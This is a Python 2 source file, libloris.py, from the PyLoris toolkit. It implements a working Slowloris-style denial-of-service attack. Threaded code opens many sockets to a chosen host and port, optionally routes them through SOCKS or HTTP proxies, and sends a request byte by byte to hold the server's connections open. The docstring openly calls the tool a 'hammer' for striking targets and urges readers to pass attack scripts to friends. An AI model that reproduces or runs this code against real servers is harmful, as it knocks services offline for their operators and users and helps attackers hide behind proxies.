#!/usr/bin/env python

"""
libloris.py
This is the main bulk of the PyLoris toolkit. This file contains:

def DefaultOptions
- The DefaultOptions function will populate a dict containing all the required
  options for running a basic PyLoris attack.

class Loris
- The Loris class is the hammer with which targets are struck. After
  instantiating this class, one must feed a dict containing connection options
  through the .LoadOptions member function. After the options are loaded, calling
  the .start member function will initiate the attack according to options
  specified. While an attack is underway, one may check the .status for a tuple of
  (# of total attacks started, # of attack threads, # of current open sockets).
  From there, you should call .messages.get, errors.get, and debug.get occasionally
  to gather additional information from PyLoris.

  See class ScriptLoris for a basic usage of the Loris class.

class ScriptLoris
- This is a base class for building attack scripts for rapid use or distribution.
  Simply instantiate a ScriptLoris object, the .options dict properties, and
  call .mainloop. Once you are satisfied with the results, pass the script along
  to your friends!
"""

# Base modules
import Queue
import socket
import thread
import threading
import time

# Some import trickery to get SSL working across Python 2.x versions.
try:
    from ssl import wrap_socket
except:
    wrap_socket = socket.ssl

# Local modules
import socks

def DefaultOptions():
    return {
        'host' : 'localhost',           # Host to attack
        'port' : 80,                    # Port to connect to
        'ssl' : False,                  # Use SSL connections
        
        'attacklimit' : 500,            # Total number of times to attack (0 for unlimited)
        'connectionlimit' : 500,        # Total number of concurrent connections (0 for unlimited)
        'threadlimit' : 50,             # Total number of threads (0 for unlimited)
        'connectionspeed' : 1,          # Connection speed in bytes/second
        'timebetweenthreads' : 1,       # Time delay between starting threads
        'timebetweenconnections' : 1,   # Time delay between starting connections
        'quitimmediately' : False,      # Close connections immediately after completing request

        'socksversion' : '',            # Enable SOCKS proxy, set to SOCKS4, SOCKS5, or HTTP
        'sockshost' : '',               # SOCKS host
        'socksport' : 0,                # SOCKS port
        'socksuser' : '',               # SOCKS username
        'sockspass' : '',               # SOCKS password

        'request' : '',                 # The main body of the attack
    }

class Loris(threading.Thread):
    options = {}

    running = False
    attacks = 0
    threads = 0
    sockets = 0

    def __init__(self):
        threading.Thread.__init__(self)
        self.connections = Queue.Queue()
        self.errors = Queue.Queue()
        self.messages = Queue.Queue()
        self.debug = Queue.Queue()
        self.options = DefaultOptions()

    def LoadOptions(self, o):
        self.options = o.copy()

    def run(self):
        self.messages.put('PyLoris is starting up.')
        self.running = True

        thread.start_new_thread(self.build_sockets, ())

        for id in range(self.options['threadlimit']):
            thread.start_new_thread(self.attack, (id,))
            self.threads += 1
            if self.options['timebetweenthreads'] > 0:
                time.sleep(self.options['timebetweenthreads'])

    def build_sockets(self):
        self.debug.put('Socket Builder started.')
        count = 0
        while (self.options['attacklimit'] == 0 or self.options['attacklimit'] > self.attacks) and self.running:
            if self.options['connectionlimit'] > self.sockets:
                if self.options['socksversion'] == 'SOCKS4' or self.options['socksversion'] == 'SOCKS5' or self.options['socksversion'] == 'HTTP':
                    if self.options['socksversion'] == 'SOCKS4': proxytype = socks.PROXY_TYPE_SOCKS4
                    elif self.options['socksversion'] == 'SOCKS5': proxytype = socks.PROXY_TYPE_SOCKS5
                    else: proxytype = socks.PROXY_TYPE_HTTP
                    s = socks.socksocket()
                    if self.options['socksuser'] == '' and self.options['sockspass'] == '':
                        s.setproxy(proxytype, self.options['sockshost'], self.options['socksport'], self.options['socksuser'], self.options['sockspass'])
                    else:
                        s.setproxy(proxytype, self.options['sockshost'], self.options['socksport'])
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                try:
                    s.connect((self.options['host'], self.options['port']))
                    if self.options['ssl'] ==  True:
                        wrap_socket(s)
                    self.connections.put((s, 0))
                    self.debug.put('Socket opened, connection created.')
                    self.attacks += 1
                    self.sockets += 1
                except Exception, ex:
                    self.errors.put('Could not connect. %s.' % (ex))
                    
            if self.options['timebetweenconnections'] > 0:
                time.sleep(self.options['timebetweenconnections'])
        self.debug.put('Socket Builder finished.')

    def attack(self, id):
        self.debug.put('Attack thread %i started' % (id))
        while self.running:
            (s, index) = self.connections.get()
            try:
                if len(self.options['request']) > index:
                    s.send(self.options['request'][index])
                    index += 1
                    self.connections.put((s, index))
                elif self.options['quitimmediately'] == False:
                    data = s.recv(1024)
                    if not len(data):
                        s.close()
                        self.debug.put('Socket closed, data tranfer finished.')
                        self.sockets -= 1
                    else:
                        self.connections.put((s, index))
                else:
                    s.close()
                    self.debug.put('Socket closed, not waiting for response.')
                    self.sockets -= 1
            except Exception, ex:
                self.errors.put(ex)
                self.debug.put('Socket closed, an exception occurred.')
                s.close()
                self.sockets -= 1

            if self.sockets == 0 and self.attacks == self.options['attacklimit']:
                self.debug.put('Attack limit reached, all sockets closed. Shutting down.')
                self.running = False
            elif self.sockets > 0 and self.options['connectionspeed'] > 0:
                time.sleep(1 / self.options['connectionspeed'] / self.sockets * self.threads)
            elif self.options['connectionspeed'] > 0:
                time.sleep(1 / self.options['connectionspeed'] * self.threads)
        self.debug.put('Attack thread %i finished.' % (id))
        self.threads -= 1

    def status(self):
        return (self.attacks, self.threads, self.sockets)

    def stop(self):
        self.messages.put('PyLoris is shutting down.')
        self.running = False
        while not self.connections.empty():
            try:
                s = self.connections.get(True, 30)
                s.close()
                self.sockets -= 1
            except:
                pass

class ScriptLoris(Loris):
    def __init__(self):
        self.options = DefaultOptions()
        Loris.__init__(self)

    def mainloop(self):
        self.start()
        time.sleep(1)
        while self.running:
            status = self.status()

            try:
                while True:
                    message = self.messages.get(False)
                    print('[MESSAGE] %s' %(message))
            except:
                pass

            try:
                while True:
                    debug = self.debug.get(False)
                    print('[DEBUG] %s' %(debug))
            except:
                pass

            try:
                while True:
                    error = self.errors.get(False)
                    print('[ERROR] %s' %(error))
            except:
                pass

            print 'Loris has started %i attacks, with %i threads and %i connections currently running.' % status
            time.sleep(1)

        status = self.status()
        print 'Pyloris has completed %i attacks.' % (status[0])
